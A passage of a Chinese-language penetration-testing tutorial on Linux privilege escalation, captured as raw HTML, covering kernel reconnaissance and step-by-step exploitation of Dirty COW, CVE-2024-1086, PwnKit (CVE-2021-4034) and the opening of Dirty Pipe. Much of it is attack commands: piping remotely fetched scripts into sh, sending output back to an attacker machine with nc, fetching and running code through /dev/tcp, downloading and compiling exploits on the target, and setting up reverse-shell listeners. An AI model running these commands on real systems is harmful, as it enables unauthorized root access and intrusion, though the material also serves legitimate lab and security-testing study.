+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/27_hu_efa11895603dcc61.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/27_hu_747c4b7476775d2f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="197"
+		data-flex-basis="474px"
+	
+></p>
+<h2 id="21系统内核提权">2.1.系统内核提权
+</h2><p><strong>内核提权是最简单有效的，我们需要先对Linux主机进行信息收集，在寻找对应EXP进行漏洞利用</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w">           </span><span class="c1">//查看内核版本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lsb_release</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">version</span><span class="w">    </span><span class="c1">//查看当前系统所使用的 Linux 内核版本信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/*-</span><span class="n">release</span><span class="w">   </span><span class="c1">//查看当前系统的发行版信息</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/28.png"
+	width="1684"
+	height="948"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/28_hu_cb72e1ba8c89a962.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/28_hu_9e74ded9513b3491.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="426px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">searchsploit</span><span class="w"> </span><span class="n">linux</span><span class="w">       </span><span class="c1">//搜索对应版本EXP</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://github.com/The-Z-Labs/linux-exploit-suggester"  target="_blank" rel="noopener"
+    >https://github.com/The-Z-Labs/linux-exploit-suggester</a>       //获取当前环境可能存在的CVE漏洞</p>
+<p><a class="link" href="https://github.com/mzet-/linux-exploit-suggester"  target="_blank" rel="noopener"
+    >https://github.com/mzet-/linux-exploit-suggester</a></p>
+<p><a class="link" href="https://github.com/jondonas/linux-exploit-suggester-2"  target="_blank" rel="noopener"
+    >https://github.com/jondonas/linux-exploit-suggester-2</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">运行该脚本</span><span class="err">，</span><span class="n">会自动帮你收集内核信息对应的EXP</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">而且会给你EXP的地址</span><span class="err">，</span><span class="n">自己下载编译就行</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/29.png"
+	width="1515"
+	height="945"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/29_hu_57997618e692a602.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/29_hu_ff109c51fc6c0320.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="160"
+		data-flex-basis="384px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">文件不落地信息收集方式</span><span class="o">---</span><span class="n">机器出网</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//github.com/carlospolop/PEASS-ng/releases/download/20230604-b0985b44/linpeas.sh | sh</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">两台主机</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">kali</span><span class="p">:</span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">61</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">centos</span><span class="p">:</span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">61</span><span class="p">.</span><span class="na">100</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">方法1</span><span class="err">：</span><span class="n">将linpeas</span><span class="p">.</span><span class="na">sh文件下载或上传到kali</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">kali</span><span class="p">:</span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvvp</span><span class="w"> </span><span class="n">81</span><span class="w"> </span><span class="o">|</span><span class="n">tee</span><span class="w"> </span><span class="n">linpeas</span><span class="p">.</span><span class="na">txt</span><span class="w">            </span><span class="n">监听81端口</span><span class="err">，</span><span class="n">并将链接数据保存在linpeas</span><span class="p">.</span><span class="na">txt文件中</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">到linpeas</span><span class="p">.</span><span class="na">sh目录下开启http共享</span><span class="err">：</span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="na">server</span><span class="w"> </span><span class="n">80</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">less</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="n">linpeas</span><span class="p">.</span><span class="na">txt</span><span class="w">                           </span><span class="n">由于传回来的文件为二进制文件</span><span class="err">，</span><span class="n">所以需要使用less</span><span class="w"> </span><span class="o">-</span><span class="n">r命令进行读取</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">centos</span><span class="p">:</span><span class="n">curl</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">61</span><span class="p">.</span><span class="na">1</span><span class="o">/</span><span class="n">linpeas</span><span class="p">.</span><span class="na">sh</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sh</span><span class="w"> </span><span class="o">|</span><span class="n">nc</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">61</span><span class="p">.</span><span class="na">1</span><span class="w"> </span><span class="n">81</span><span class="w">     </span><span class="n">在内存中运行linpeas</span><span class="p">.</span><span class="na">sh文件</span><span class="err">，</span><span class="n">并且链接kali81端口</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">方法2</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">kali</span><span class="p">:</span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="n">80</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">linpeas</span><span class="p">.</span><span class="na">sh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">centos</span><span class="p">:</span><span class="n">cat</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">61</span><span class="p">.</span><span class="na">1</span><span class="o">/</span><span class="n">80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sh</span><span class="w">                      </span><span class="n">不用使用curl命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">kill</span><span class="w"> </span><span class="o">-</span><span class="n">9</span><span class="w"> </span><span class="o">%</span><span class="n">1</span><span class="w">														</span><span class="n">关闭最近一个进程</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">rlwrap</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvvp</span><span class="w"> </span><span class="n">443</span><span class="w">                                  </span><span class="n">反弹shell时增强交互性</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/30.png"
+	width="1723"
+	height="945"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/30_hu_62cb679cb6c6f32e.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/30_hu_bef09440e739b566.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="437px"
+	
+></p>
+<h3 id="211cve-2016-5195脏牛漏洞提权">2.1.1.CVE-2016-5195&mdash;脏牛漏洞提权
+</h3><p><strong>Dirty COW漏洞是一种发生在写时复制的竞态条件漏洞，它影响所有基于Linux的操作系统，包括Android，这个漏洞2007年起就存在于Linux内核中，直到2016年才被发现和修复。可以利用这个漏洞修改受保护的文件，也可以利用这个漏洞提权</strong></p>
+<p><strong><font style="color:#DF2A3F;">影响版本：Linux Kernel &gt;= 2.6.22</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">searchsploit</span><span class="w"> </span><span class="n">dirty</span><span class="w">             </span><span class="n">查找脏牛漏洞exp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">locate</span><span class="w"> </span><span class="n">40847</span><span class="p">.</span><span class="na">cpp</span><span class="w">                </span><span class="n">查找exp路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cp</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">exploitdb</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">40847</span><span class="p">.</span><span class="na">cpp</span><span class="w"> </span><span class="p">.</span><span class="w">        </span><span class="n">复制exp到当前路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">SimpleHTTPServer</span><span class="w">                          </span><span class="n">kali开启http共享</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wget</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//192.168.61.128:8000/40847.cpp           靶机下载exp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">g</span><span class="o">++</span><span class="w"> </span><span class="o">-</span><span class="n">Wall</span><span class="w"> </span><span class="o">-</span><span class="n">pedantic</span><span class="w"> </span><span class="o">-</span><span class="n">O2</span><span class="w"> </span><span class="o">-</span><span class="n">std</span><span class="o">=</span><span class="n">c</span><span class="o">++</span><span class="n">11</span><span class="w"> </span><span class="o">-</span><span class="n">pthread</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">dcow</span><span class="w"> </span><span class="n">40847</span><span class="p">.</span><span class="na">cpp</span><span class="w"> </span><span class="o">-</span><span class="n">lutil</span><span class="w">   </span><span class="n">编译</span><span class="w">     
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">&#39;</span><span class="kn">import</span><span class="w"> </span><span class="nn">pty</span><span class="p">;</span><span class="w"> </span><span class="n">pty</span><span class="p">.</span><span class="na">spawn</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">)</span><span class="err">&#39;</span><span class="w">      </span><span class="n">开启交互式脚本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">dcow</span><span class="w">                                                 </span><span class="n">靶机执行脚本</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="212cve-2024-1086">2.1.2.CVE-2024-1086
+</h3><p><strong><font style="color:#DF2A3F;">影响版本：5.14 &lt;= Linux内核 &lt;=6.6</font></strong></p>
+<p>EXP：<a class="link" href="https://github.com/Notselwyn/CVE-2024-1086"  target="_blank" rel="noopener"
+    >https://github.com/Notselwyn/CVE-2024-1086</a></p>
+<p><a class="link" href="https://github.com/Notselwyn/CVE-2024-1086/releases/tag/v1.0.0"  target="_blank" rel="noopener"
+    >https://github.com/Notselwyn/CVE-2024-1086/releases/tag/v1.0.0</a>      Debian/Ubuntu使用这个</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w">       </span><span class="n">查看内核版本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">git</span><span class="w"> </span><span class="n">clone</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//github.com/Notselwyn/CVE-2024-1086</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cd</span><span class="w"> </span><span class="n">CVE</span><span class="o">-</span><span class="n">2024</span><span class="o">-</span><span class="n">1086</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">make</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="213cve-2021-4034利用linux-polkit-权限提升漏洞">2.1.3.<font style="color:rgb(51, 51, 51);">CVE-2021-4034&mdash;利用Linux Polkit 权限提升漏洞</font>
+</h3><p><a class="link" href="https://blog.csdn.net/laobanjiull/article/details/122715651"  target="_blank" rel="noopener"
+    >CVE-2021-4034：Linux Polkit 权限提升漏洞复现及修复-CSDN博客</a></p>
+<p><strong><font style="color:#DF2A3F;">影响版本：</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Debain</span><span class="w"> </span><span class="n">stretch</span><span class="w"> </span><span class="n">policykit</span><span class="o">-</span><span class="n">1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">.</span><span class="na">105</span><span class="o">-</span><span class="n">18</span><span class="o">+</span><span class="n">deb9u2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Debain</span><span class="w"> </span><span class="n">buster</span><span class="w"> </span><span class="n">policykit</span><span class="o">-</span><span class="n">1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">.</span><span class="na">105</span><span class="o">-</span><span class="n">25</span><span class="o">+</span><span class="n">deb10u1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Debain</span><span class="w"> </span><span class="n">bookworm</span><span class="p">,</span><span class="w"> </span><span class="n">bullseye</span><span class="w"> </span><span class="n">policykit</span><span class="o">-</span><span class="n">1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">.</span><span class="na">105</span><span class="o">-</span><span class="n">31</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">21</span><span class="p">.</span><span class="na">10</span><span class="w"> </span><span class="p">(</span><span class="n">Impish</span><span class="w"> </span><span class="n">Indri</span><span class="p">)</span><span class="w"> </span><span class="n">policykit</span><span class="o">-</span><span class="n">1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">.</span><span class="na">105</span><span class="o">-</span><span class="n">31ubuntu0</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">21</span><span class="p">.</span><span class="na">04</span><span class="w"> </span><span class="p">(</span><span class="n">Hirsute</span><span class="w"> </span><span class="n">Hippo</span><span class="p">)</span><span class="w"> </span><span class="n">policykit</span><span class="o">-</span><span class="n">1</span><span class="w"> </span><span class="nf">Ignored</span><span class="w"> </span><span class="p">(</span><span class="n">reached</span><span class="w"> </span><span class="n">end</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="n">life</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">20</span><span class="p">.</span><span class="na">04</span><span class="w"> </span><span class="nf">LTS</span><span class="w"> </span><span class="p">(</span><span class="n">Focal</span><span class="w"> </span><span class="n">Fossa</span><span class="p">)</span><span class="w"> </span><span class="n">policykit</span><span class="o">-</span><span class="n">1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">.</span><span class="na">105</span><span class="o">-</span><span class="n">26ubuntu1</span><span class="p">.</span><span class="na">2</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">18</span><span class="p">.</span><span class="na">04</span><span class="w"> </span><span class="nf">LTS</span><span class="w"> </span><span class="p">(</span><span class="n">Bionic</span><span class="w"> </span><span class="n">Beaver</span><span class="p">)</span><span class="w"> </span><span class="n">policykit</span><span class="o">-</span><span class="n">1</span><span class="w"> </span><span class="o">&lt;</span><span class="n">0</span><span class="p">.</span><span class="na">105</span><span class="o">-</span><span class="n">20ubuntu0</span><span class="p">.</span><span class="na">18</span><span class="p">.</span><span class="na">04</span><span class="p">.</span><span class="na">6</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">16</span><span class="p">.</span><span class="na">04</span><span class="w"> </span><span class="nf">ESM</span><span class="w"> </span><span class="p">(</span><span class="n">Xenial</span><span class="w"> </span><span class="n">Xerus</span><span class="p">)</span><span class="w"> </span><span class="n">policykit</span><span class="o">-</span><span class="n">1</span><span class="w"> </span><span class="o">&lt;</span><span class="n">0</span><span class="p">.</span><span class="na">105</span><span class="o">-</span><span class="n">14</span><span class="p">.</span><span class="na">1ubuntu0</span><span class="p">.</span><span class="na">5</span><span class="o">+</span><span class="n">esm1</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">14</span><span class="p">.</span><span class="na">04</span><span class="w"> </span><span class="nf">ESM</span><span class="w"> </span><span class="p">(</span><span class="n">Trusty</span><span class="w"> </span><span class="n">Tahr</span><span class="p">)</span><span class="w"> </span><span class="n">policykit</span><span class="o">-</span><span class="n">1</span><span class="w"> </span><span class="o">&lt;</span><span class="n">0</span><span class="p">.</span><span class="na">105</span><span class="o">-</span><span class="n">4ubuntu3</span><span class="p">.</span><span class="na">14</span><span class="p">.</span><span class="na">04</span><span class="p">.</span><span class="na">6</span><span class="o">+</span><span class="n">esm1</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">CentOS</span><span class="w"> </span><span class="n">6</span><span class="w"> </span><span class="n">polkit</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">polkit</span><span class="o">-</span><span class="n">0</span><span class="p">.</span><span class="na">96</span><span class="o">-</span><span class="n">11</span><span class="p">.</span><span class="na">el6_10</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">CentOS</span><span class="w"> </span><span class="n">7</span><span class="w"> </span><span class="n">polkit</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">polkit</span><span class="o">-</span><span class="n">0</span><span class="p">.</span><span class="na">112</span><span class="o">-</span><span class="n">26</span><span class="p">.</span><span class="na">el7_9</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">CentOS</span><span class="w"> </span><span class="n">8</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="n">polkit</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">polkit</span><span class="o">-</span><span class="n">0</span><span class="p">.</span><span class="na">115</span><span class="o">-</span><span class="n">13</span><span class="p">.</span><span class="na">el8_5</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">CentOS</span><span class="w"> </span><span class="n">8</span><span class="p">.</span><span class="na">2</span><span class="w"> </span><span class="n">polkit</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">polkit</span><span class="o">-</span><span class="n">0</span><span class="p">.</span><span class="na">115</span><span class="o">-</span><span class="n">11</span><span class="p">.</span><span class="na">el8_2</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">CentOS</span><span class="w"> </span><span class="n">8</span><span class="p">.</span><span class="na">4</span><span class="w"> </span><span class="n">polkit</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">polkit</span><span class="o">-</span><span class="n">0</span><span class="p">.</span><span class="na">115</span><span class="o">-</span><span class="n">11</span><span class="p">.</span><span class="na">el8_4</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><font style="color:#DF2A3F;">exp下载地址：</font></strong><a class="link" href="https://github.com/arthepsy/CVE-2021-4034"  target="_blank" rel="noopener"
+    ><strong><font style="color:#DF2A3F;">https://github.com/arthepsy/CVE-2021-4034</font></strong></a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">下载后编译上传</span><span class="err">：</span><span class="n">gcc</span><span class="w"> </span><span class="n">cve</span><span class="o">-</span><span class="n">2021</span><span class="o">-</span><span class="n">4034</span><span class="o">-</span><span class="n">poc</span><span class="p">.</span><span class="na">c</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">exp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">给执行权限</span><span class="err">：</span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="n">exp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">exp</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wget</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//github.com/berdav/CVE-2021-4034</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">unzip</span><span class="w"> </span><span class="n">CVE</span><span class="o">-</span><span class="n">2021</span><span class="o">-</span><span class="n">4034</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">make</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="n">2021</span><span class="o">-</span><span class="n">4034</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/31.png"
+	width="1804"
+	height="729"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/31_hu_a2a26a96fc0b01ad.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/31_hu_65155ef80683c9ac.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="593px"
+	
+></p>
+<h3 id="214cve-2022-0847linux脏管道提权">2.1.4.CVE-2022-0847&mdash;Linux脏管道提权
+</h3><p><strong><font style="color:#DF2A3F;">影响版本：Linux Kernel版本 &gt;= 5.8</font></strong></p>
+<p><strong><font style="color:#DF2A3F;">Linux Kernel版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</font></strong></p>
+<p><strong><font style="color:#DF2A3F;">CentOS 8 默认内核版本受该漏洞影响</font></strong></p>
+<p><strong><font style="color:#DF2A3F;">CentOS 7 及以下版本不受影响</font></strong></p>
